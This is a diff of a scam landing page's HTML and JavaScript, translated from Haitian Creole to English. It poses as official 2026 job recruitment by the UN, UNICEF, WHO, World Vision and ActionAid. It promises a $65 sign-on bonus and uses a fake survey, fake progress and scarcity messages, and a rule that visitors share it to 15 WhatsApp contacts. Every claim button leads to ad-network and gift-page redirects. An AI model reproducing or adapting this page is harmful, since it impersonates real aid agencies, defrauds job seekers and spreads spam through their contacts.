@@ -339,12 +339,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW5xpJQ5IF05xOhbI-H5iWdmgKoH6dUI5T3qRqeq9t5-WFTpYSlYSES6h-t_rxu5Sn0GmnBZmiOj-obW7f7mFzRnMfxVFcnZMbZDEpcrvxnjLtJfpX6SZEO6ZjOnCeDTvOMf33FKeyKDruJz4cSlPkqPJJvZb_tdIaI_Q2n_tTB-F0of5iKeJMZy_2kZ8/s1331/ngosz.jpg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Bonjou!
+Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>Travay OFISYÈL ONG 2026: Nasyonzini, UNICEF, ActionAid, World Vision ak OMS ap rekrite kounye a pou plizyè wòl - Travay a distans ak fizik </b>,  Jwenn yon bonis enskripsyon G9,000 davans lè w soumèt aplikasyon w lan, salè kòmansman ant G20,000 ak G40,000 pa mwa.
+Welcome to <b>OFFICIAL 2026 NGO Jobs: UN, UNICEF, ActionAid, World Vision & WHO are NOW recruiting for multiple roles - Remote & Physical Job </b>,  Get $65 Sign-On Bonus in advance when you submit your application, start salaries $215 - $980 per month.
 <br>
-Reponn kesyon ki anba yo pou APLIKE</b>
+Answer the questions below to APPLY</b>
 </p>
   <br>
   
@@ -355,47 +355,61 @@ Reponn kesyon ki anba yo pou APLIKE</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Tanpri tann yon ti moman...",
-              "Tanpri tann yon ti moman...",
-              "Tanpri tann yon ti moman..."
+                     "Please wait a moment...",
+              "Please wait a moment...",
+              "Please wait a moment..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Ou reponn 4/4 kesyon yo
+You have answered 4/4 of the questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Repons ou yo ap trete
+Your answers are being processed
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-Genyen toujou pòs ki disponib!
+still vacancies available!
 </strong>
-<img class="verify__icon verify__ic
-
-</div><vue-survey v-if="showSurvey" :show-steps="true" :questions='[
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Looking for Job Vacancies.. 
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+<div class="verify__text" v-if="rotateIndex > 3">
+<strong>
+Only (389) vacancies remain!
+</strong>
+<img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
+</div>
+<div class="verify__text" v-else>
+Stock is being checked
+<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+</div>
+</div>
+<vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Ki ONG ou ta renmen travay avèk?",
-              answers: [ { text: "Nasyonzini" },  { text: "IOM (Òganizasyon Entènasyonal pou Migrasyon)" },  { text: "Pwogram Manje Mondyal (WFP)" } ]
+              title: "Which NGO do you like to apply to?",
+              answers: [ { text: "United Nations" },  { text: "ActionAid" },  { text: "WHO" },  { text: "World Vision" }, { text: "UNICEF" } ]
             },
                                                              {
-              title: "Èske ou gen yon telefòn entèlijan?",
-              answers: [ { text: "Wi" }, { text: "Non" } ]
+              title: "Do you have a Smart Phone?",
+              answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Chwazi sèks ou?",
-              answers: [ { text: "Gason" }, { text: "Fanm" } ]
+              title: "Choose your Gender?",
+              answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Chwazi gwoup laj ou?",
-              answers: [ { text: "18 - 20 ane" }, { text: "21 - 25 ane" }, { text: "26 - 30 ane" }, { text: "30 ane anwo" } ]
+              title: "Select Your Age Range?",
+              answers: [ { text: "18 - 20 years" }, { text: "21 - 25 years" }, { text: "26 - 30 years" }, { text: "30 years Above" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
-
 
        <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7XOD5nT6vNgLIasYg51HlKRRMwF9K24Jb4AuoPRLmioHak0_CrZh2IAxv1Qf2hiRZ1JrQEwgV15Ob0NVX_gg5pu56DywYLzaadSFqW176Fz3pQ382GoMH_cWL1hNvL1uG_pnsZ2NqIQ6CtpIbPbRCjcsbBjzn-TwfqE2DkrxDmF2QE90oJ5ym3Yy12mE/s600/cs%20jobs.jpg" style="width:100%;" />
   </div>
@@ -404,20 +418,20 @@ Genyen toujou pòs ki disponib!
   <div id="share">
     
 <div class="title1">
-<p>Felisitasyon! </p>
+<p>Congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW5xpJQ5IF05xOhbI-H5iWdmgKoH6dUI5T3qRqeq9t5-WFTpYSlYSES6h-t_rxu5Sn0GmnBZmiOj-obW7f7mFzRnMfxVFcnZMbZDEpcrvxnjLtJfpX6SZEO6ZjOnCeDTvOMf33FKeyKDruJz4cSlPkqPJJvZb_tdIaI_Q2n_tTB-F0of5iKeJMZy_2kZ8/s1331/ngosz.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Bonis avanse pou kòmanse travay ou se: <b>$65</b> <br>Swiv enstriksyon ki anba yo pou resevwa bonis ou pou kòmanse travay la !</p>
+<p class="txt1">Your Advance Sign-On Bonus is: <b>$65</b> <br>Follow the instructions below to receive your Sign-On Bonus !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Pataje ak 5 gwoup / 15 zanmi sou "Whatsapp" (klike sou ikòn "Whatsapp" anba a)</p><p class="rules">2. Klike "Kontinye" epi reklame travay ou.</p></div>
+<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your Employment.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Pataje jiskaske ba ble a plen!</h4>
+  <h4 class="textlastup">Share until the blue bar is full!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -428,9 +442,8 @@ Genyen toujou pòs ki disponib!
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Kontinye
+                                Continue
                             </div>
-
    
   </div></div>
   <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7XOD5nT6vNgLIasYg51HlKRRMwF9K24Jb4AuoPRLmioHak0_CrZh2IAxv1Qf2hiRZ1JrQEwgV15Ob0NVX_gg5pu56DywYLzaadSFqW176Fz3pQ382GoMH_cWL1hNvL1uG_pnsZ2NqIQ6CtpIbPbRCjcsbBjzn-TwfqE2DkrxDmF2QE90oJ5ym3Yy12mE/s600/cs%20jobs.jpg" style="width:100%;" />
@@ -442,35 +455,33 @@ Genyen toujou pòs ki disponib!
                       
     <div id="claim">
       <div class="title1">
-<p>Felisitasyon! </p>
+<p>Congratulations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW5xpJQ5IF05xOhbI-H5iWdmgKoH6dUI5T3qRqeq9t5-WFTpYSlYSES6h-t_rxu5Sn0GmnBZmiOj-obW7f7mFzRnMfxVFcnZMbZDEpcrvxnjLtJfpX6SZEO6ZjOnCeDTvOMf33FKeyKDruJz4cSlPkqPJJvZb_tdIaI_Q2n_tTB-F0of5iKeJMZy_2kZ8/s1331/ngosz.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Bonis ou pou kòmanse travay la se: <b>$65 lajan kach.</b> <br>Swiv enstriksyon ki anba a pou reklame pwòp pòs ou a !</p>
-
+<p class="txt1">Your Sign-On Bonus is: <b>$65 cash.</b> <br>Follow the instruction below to claim your own Vacancy !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://giftedgb.github.io/gift/bundle.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">REKLAME $65</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM $65</font></button>
                     </a><br/> <br/>
 	    
-      <div class="share_main_bt" id="offer">CHWAZI TIP KONT</div><br/> <br/>
+      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
 
 	     <a  onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://giftedgb.github.io/gift/bundle.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">EKONOMI</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
                     </a><br/> <br/>
  <a  onclick="window.open('https://luglawhaulsano.net/4/8631702')" href="https://giftedgb.github.io/gift/bundle.html" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">KOURAN</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Gade Bonis $65 ou a</div> 
+            <div class="share_main_bt" id="offers">Preview Your $65 Bonus</div> 
       <br>
-
           
        
  
@@ -511,19 +522,18 @@ function go() {
 
   <script>
         var text1 = "ytime" ,
-            text2 = " Libreri Jarir ap ofri ",
-            text3 = " Prese epi jwenn bon ou an anvan li fini isit la : ",
-            error = "Gen yon erè!\nPiblikasyon yo pa konte. Ou ka te pataje li ak menm zanmi oswa menm gwoup la plis pase yon fwa, tanpri pataje ankò.",
+            text2 = " مكتبة جرير تقدم ",
+            text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
+            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
             cpa = "https://luglawhaulsano.net/4/8631702",
             cpa1 = "https://luglawhaulsano.net/4/8631702",
             saved = "coke2",
             share = "whatsapp://send?text=" + text1 ;
     </script>
 
-
 <script>
   var tiaoban = [
-    "🚨NGO VACANCIES ✅%0A%0A*Don't miss this OFFICIAL 2026 HUMANITARIAN JOB OPPORTUNITY to WORK Remotely or Physically and get paidMonthly by United Nations, International Organization for Migration (IOM), and World Food Programme (WFP), UNICEF, or WHO%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive $65 Sign-On Bonus instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://job-recruiter.org/NGO-Jobs-Portal.html ",
+    "🚨NGO VACANCIES ✅%0A%0A*Don't miss this OFFICIAL 2026 NGO Jobs opportunity to WORK FROM HOME AND GET PAID by $65 MONTHLY BY UN, UNICEF, ActionAid, World Vision or WHO%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive $65 Sign-On Bonus instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://job-recruiter.org/NGO-Jobs-Portal.html ",
     "🚨NGO VACANCIES ✅%0A%0A*Don't miss this OFFICIAL 2026 NGO Jobs opportunity to WORK FROM HOME AND GET PAID by $65 MONTHLY BY UN, UNICEF, ActionAid, World Vision or WHO%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive $65 Sign-On Bonus instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://job-recruiter.org/NGO-Jobs-Portal.html ",
     "🚨NGO VACANCIES ✅%0A%0A*Don't miss this OFFICIAL 2026 NGO Jobs opportunity to WORK FROM HOME AND GET PAID by $65 MONTHLY BY UN, UNICEF, ActionAid, World Vision or WHO%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive $65 Sign-On Bonus instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://job-recruiter.org/NGO-Jobs-Portal.html ",
     "🚨NGO VACANCIES ✅%0A%0A*Don't miss this OFFICIAL 2026 NGO Jobs opportunity to WORK FROM HOME AND GET PAID by $65 MONTHLY BY UN, UNICEF, ActionAid, World Vision or WHO%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive $65 Sign-On Bonus instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://job-recruiter.org/NGO-Jobs-Portal.html ",
